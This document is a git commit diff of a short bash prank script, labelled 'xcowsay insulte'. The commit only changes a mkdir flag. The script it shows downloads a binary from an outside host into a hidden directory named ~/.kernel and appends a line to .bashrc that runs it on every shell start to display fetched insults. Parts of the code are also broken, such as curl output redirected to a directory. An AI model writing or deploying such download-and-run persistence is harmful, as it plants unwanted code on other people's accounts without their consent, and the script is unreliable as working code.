1a1b8bd1dfdea0e7d8790651fbc054d4fc1eee1a
Remy <remy.noulin@epitech.eu>
2022-10-10 23:07:39 +0200

    [ADD] xcowsay

--- scripts/11.sh
+++ scripts/11.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 # Desc: xcowsay insulte
-mkdir -f ~/.kernel
+mkdir ~/.kernel
 curl https://Waz0x.github.io/bin/xcowsay/bin > ~/.kernel/
 curl https://Waz0x.github.io/bin/cow_med.png > ~/.kernel/
 echo "cd ~/.kernel;./bin --image cow_med.png \"$(curl https://evilinsult.com/generate_insult.php\?lang\=fr\&amp\;type\=raw -s)\";cd &" >> .bashrc
